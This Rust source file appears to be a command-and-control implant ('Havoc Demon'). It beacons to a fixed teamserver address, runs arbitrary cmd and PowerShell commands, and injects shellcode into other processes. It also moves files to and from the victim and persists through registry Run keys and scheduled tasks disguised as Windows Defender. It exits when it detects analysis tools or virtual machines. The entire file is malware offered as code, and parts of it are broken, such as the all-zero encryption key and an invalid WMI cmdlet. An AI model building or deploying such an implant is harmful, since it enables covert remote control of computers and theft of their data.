use std::{env, process::Command, time::Duration, fs};
use tokio::{net::TcpStream, time::sleep};
use log::{info, error};
use simple_logger::SimpleLogger;
use rand::{Rng, rngs::OsRng};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use serde::{Deserialize, Serialize};
use std::error::Error;
use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThread};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::winnt::{PROCESS_ALL_ACCESS, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use winapi::shared::minwindef::LPVOID;
use base64::{Engine as _, engine::general_purpose};

type Aes256Cbc = Cbc<Aes256, Pkcs7>;

const TEAMSERVER: &str = "192.168.1.186:50050";
const SLEEP_TIME: u64 = 60;
const JITTER: u64 = 10;
const AES_KEY: [u8; 32] = [0; 32];
const AES_IV: [u8; 16] = [0; 16];

#[derive(Serialize, Deserialize, Debug)]
struct TaskData {
    task_id: u32,
    command: String,
    args: Vec<String>,
    data: Option<String> // For shellcode/file data
}

#[derive(Serialize, Deserialize, Debug)]
struct DemonMetadata {
    hostname: String,
    username: String,
    domain: String,
    os_info: String,
    privileges: String,
    process_name: String,
    process_id: u32,
}

#[derive(Serialize, Deserialize, Debug)]
struct BeaconResponse {
    metadata: DemonMetadata,
    task_output: Option<String>,
    error: Option<String>
}

#[tokio::main]
async fn main() {
    SimpleLogger::new().init().unwrap();
    info!("Havoc Demon initializing...");

    if let Err(e) = setup_demon().await {
        error!("Failed to initialize demon: {}", e);
        return;
    }

    let mut last_checkin = std::time::Instant::now();
    
    loop {
        match beacon().await {
            Ok(_) => {
                last_checkin = std::time::Instant::now();
                let sleep_jitter = calculate_sleep_jitter(SLEEP_TIME, JITTER);
                sleep(Duration::from_secs(sleep_jitter)).await;
            },
            Err(e) => {
                error!("Beacon failed: {}", e);
                // Exponential backoff based on failure time
                let failure_duration = last_checkin.elapsed().as_secs();
                let backoff = std::cmp::min(SLEEP_TIME * 2u64.pow((failure_duration / 3600) as u32), 86400);
                sleep(Duration::from_secs(backoff)).await;
            }
        }
    }
}

async fn setup_demon() -> Result<(), Box<dyn Error>> {
    if let Err(e) = check_opsec() {
        error!("OPSEC check failed: {}", e);
        std::process::exit(1);
    }
    establish_persistence().await?;
    Ok(())
}

async fn beacon() -> Result<(), Box<dyn Error>> {
    let mut stream = TcpStream::connect(TEAMSERVER).await?;
    
    // Initial metadata collection
    let metadata = collect_metadata().await?;
    let beacon_data = BeaconResponse {
        metadata,
        task_output: None,
        error: None
    };
    
    // Encrypt and send metadata
    let encrypted_data = encrypt_data(&serde_json::to_vec(&beacon_data)?)?;
    stream.write_u32_le(encrypted_data.len() as u32).await?;
    stream.write_all(&encrypted_data).await?;
    
    // Read response length
    let response_len = stream.read_u32_le().await? as usize;
    if response_len > 0 {
        let mut response = vec![0u8; response_len];
        stream.read_exact(&mut response).await?;
        
        let decrypted = decrypt_data(&response)?;
        let tasks: Vec<TaskData> = serde_json::from_slice(&decrypted)?;
        
        for task in tasks {
            let task_result = execute_task(task).await;
            
            // Send task result back
            let result = BeaconResponse {
                metadata: collect_metadata().await?,
                task_output: task_result.as_ref().ok().map(|s| s.to_string()),
                error: task_result.as_ref().err().map(|e| e.to_string())
            };
            
            let encrypted_result = encrypt_data(&serde_json::to_vec(&result)?)?;
            stream.write_u32_le(encrypted_result.len() as u32).await?;
            stream.write_all(&encrypted_result).await?;
        }
    }

    Ok(())
}

async fn execute_task(task: TaskData) -> Result<String, Box<dyn Error>> {
    info!("Executing task {}: {}", task.task_id, task.command);
    
    match task.command.as_str() {
        "shell" => {
            let output = execute_shell(&task.args.join(" ")).await?;
            Ok(output)
        },
        "powershell" => {
            let output = execute_powershell(&task.args.join(" ")).await?;
            Ok(output)
        },
        "inject" => {
            let pid = task.args[0].parse::<u32>()?;
            let shellcode = general_purpose::STANDARD.decode(&task.data.unwrap())?;
            inject_shellcode(pid, &shellcode)?;
            Ok("Injection successful".to_string())
        },
        "download" => {
            let file_content = fs::read(&task.args[0])?;
            Ok(general_purpose::STANDARD.encode(file_content))
        },
        "upload" => {
            let file_path = &task.args[0];
            let file_data = general_purpose::STANDARD.decode(task.data.unwrap())?;
            fs::write(file_path, file_data)?;
            Ok(format!("File uploaded to {}", file_path))
        },
        "sleep" => {
            let new_sleep = task.args[0].parse::<u64>()?;
            Ok(format!("Sleep time updated to {} seconds", new_sleep))
        },
        "exit" => {
            info!("Exit command received");
            std::process::exit(0);
        },
        _ => Err("Unknown command".into())
    }
}

async fn execute_shell(cmd: &str) -> Result<String, Box<dyn Error>> {
    let output = Command::new("cmd")
        .args(&["/C", cmd])
        .output()?;
    
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

async fn execute_powershell(script: &str) -> Result<String, Box<dyn Error>> {
    let output = Command::new("powershell")
        .args(&["-NoProfile", "-NonInteractive", "-Command", script])
        .output()?;

    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

fn inject_shellcode(pid: u32, shellcode: &[u8]) -> Result<(), Box<dyn Error>> {
    unsafe {
        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        
        let remote_buffer = VirtualAllocEx(
            process_handle,
            std::ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        let mut bytes_written = 0;
        WriteProcessMemory(
            process_handle,
            remote_buffer,
            shellcode.as_ptr() as LPVOID,
            shellcode.len(),
            &mut bytes_written
        );

        CreateRemoteThread(
            process_handle,
            std::ptr::null_mut(),
            0,
            Some(std::mem::transmute(remote_buffer)),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut()
        );
    }
    Ok(())
}

async fn establish_persistence() -> Result<(), Box<dyn Error>> {
    let exe_path = env::current_exe()?;
    
    // Execute each persistence method
    let reg_result = Command::new("reg")
        .args(&["add", "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
               "/v", "WindowsDefender", 
               "/t", "REG_SZ",
               "/d", &exe_path.to_string_lossy(),
               "/f"])
        .output()
        .map_err(|e| Box::new(e) as Box<dyn Error>)?;

    if !reg_result.status.success() {
        let error_msg = String::from_utf8_lossy(&reg_result.stderr);
        error!("Registry persistence failed: {}", error_msg);
    }

    let task_result = Command::new("schtasks")
        .args(&["/create", "/tn", "WindowsDefenderUpdate",
               "/tr", &exe_path.to_string_lossy(),
               "/sc", "onlogon",
               "/rl", "highest",
               "/f"])
        .output()
        .map_err(|e| Box::new(e) as Box<dyn Error>)?;

    if !task_result.status.success() {
        let error_msg = String::from_utf8_lossy(&task_result.stderr);
        error!("Scheduled task persistence failed: {}", error_msg);
    }

    let wmi_result = Command::new("powershell")
        .args(&["-Command", &format!(
            "New-WMIEvent -Query 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\"' -Action {{{}}}",
            exe_path.to_string_lossy()
        )])
        .output()
        .map_err(|e| Box::new(e) as Box<dyn Error>)?;

    if !wmi_result.status.success() {
        let error_msg = String::from_utf8_lossy(&wmi_result.stderr);
        error!("WMI persistence failed: {}", error_msg);
    }

    // If at least one persistence method succeeded, return Ok
    if reg_result.status.success() || task_result.status.success() || wmi_result.status.success() {
        Ok(())
    } else {
        Err("All persistence methods failed".into())
    }
}

fn check_opsec() -> Result<(), Box<dyn Error>> {
    let suspicious_processes = [
        "wireshark", "procmon", "processhacker", "x64dbg", "ollydbg",
        "pestudio", "processhacker2", "ida64", "ida", "immunity"
    ];
    
    let output = Command::new("tasklist").output()?;
    let process_list = String::from_utf8_lossy(&output.stdout).to_lowercase();
    
    for proc in suspicious_processes {
        if process_list.contains(proc) {
            error!("Analysis tool detected: {}", proc);
            return Err("Analysis environment detected".into());
        }
    }
    
    // Check for VM artifacts
    let vm_artifacts = [
        "vmware", "virtualbox", "vbox", "qemu", "xen"
    ];
    
    let systeminfo = Command::new("systeminfo").output()?;
    let sysinfo_text = String::from_utf8_lossy(&systeminfo.stdout).to_lowercase();
    
    for artifact in vm_artifacts {
        if sysinfo_text.contains(artifact) {
            error!("Virtual machine detected: {}", artifact);
            return Err("Virtual environment detected".into());
        }
    }
    
    Ok(())
}

async fn collect_metadata() -> Result<DemonMetadata, Box<dyn Error>> {
    Ok(DemonMetadata {
        hostname: String::from_utf8_lossy(&Command::new("hostname").output()?.stdout).trim().to_string(),
        username: env::var("USERNAME")?,
        domain: env::var("USERDOMAIN")?,
        os_info: String::from_utf8_lossy(&Command::new("ver").output()?.stdout).trim().to_string(),
        privileges: if is_elevated()? { "Administrator".to_string() } else { "User".to_string() },
        process_name: env::current_exe()?.file_name().unwrap().to_string_lossy().to_string(),
        process_id: std::process::id(),
    })
}

fn is_elevated() -> Result<bool, Box<dyn Error>> {
    let output = Command::new("whoami")
        .args(&["/groups"])
        .output()?;
    Ok(String::from_utf8_lossy(&output.stdout).contains("S-1-16-12288"))
}

fn calculate_sleep_jitter(sleep: u64, jitter: u64) -> u64 {
    let mut rng = OsRng;
    let jitter_amount = (sleep as f64 * (jitter as f64 / 100.0)) as u64;
    sleep + rng.gen_range(0..=jitter_amount)
}

fn encrypt_data(data: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
    let cipher = Aes256Cbc::new_from_slices(&AES_KEY, &AES_IV)?;
    Ok(cipher.encrypt_vec(data))
}

fn decrypt_data(data: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
    let cipher = Aes256Cbc::new_from_slices(&AES_KEY, &AES_IV)?;
    cipher.decrypt_vec(data).map_err(|e| e.into())
}
              

